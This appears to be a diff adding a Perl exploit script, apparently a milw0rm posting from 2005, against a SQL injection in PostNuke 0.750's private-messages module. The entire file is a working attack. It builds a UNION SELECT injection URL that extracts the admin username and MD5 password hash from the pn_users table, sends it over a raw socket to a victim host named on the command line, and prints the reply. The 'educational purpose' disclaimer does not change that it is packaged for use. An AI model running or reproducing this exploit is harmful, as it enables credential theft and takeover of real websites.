@@ -1,0 +1,62 @@
+#!/usr/bin/perl
+# This tools is only for educational purpose
+#
+# K-C0d3r a x0n3-h4ck friend !!!
+#
+# This exploit should give admin nick and md5 password
+#
+#-=[ PostNuke SQL Injection                     version : x=> 0.750]=-
+#-=[                                                               ]=-
+#-=[ Discovered by sp3x                                            ]=-
+#-=[ Coded by K-C0d3r                                              ]=-
+#-=[ irc.xoned.net #x0n3-h4ck to find me   K-c0d3r[at]x0n3-h4ck.org]=-
+#
+# Greetz to mZ, 2b TUBE, off, rikky, milw0rm, str0ke
+#
+# !!! NOW IS PUBLIC (6-6-2005) !!!
+
+use IO::Socket;
+
+sub Usage {
+print STDERR "Usage: KCpnuke-xpl.pl <www.victim.com> </path/to/modules.php>\n";
+exit;
+}
+
+if (@ARGV < 2)
+{
+ Usage();
+}
+
+if (@ARGV > 2)
+{
+ Usage();
+}
+
+if (@ARGV == 2)
+{
+$host = @ARGV[0];
+$path = @ARGV[1];
+
+print "[K-C0d3r] PostNuke SQL Injection [x0n3-h4ck]\n";
+print "[+] Connecting to $host\n";
+
+$injection = "$host\/$path?";
+$injection .= "op=modload&name=Messages&file=readpmsg&start=0";
+$injection .= "%20UNION%20SELECT%20pn_uname,null,pn_uname,pn_pass,pn_pass,null,pn_pass,null";
+$injection .= "%20FROM%20pn_users%20WHERE%20pn_uid=2\/*&total_messages=1";
+
+$socket = new IO::Socket::INET (PeerAddr => "$host",
+                                PeerPort => 80,
+                                Proto => 'tcp');
+                                die unless $socket;
+
+print "[+] Injecting command ...\n";
+print $socket "GET http://$injection HTTP/1.1\nHost: $host\n\n";
+while (<$socket>)
+{
+ print $_;
+ exit;
+}
+}
+
+# milw0rm.com [2005-06-05]
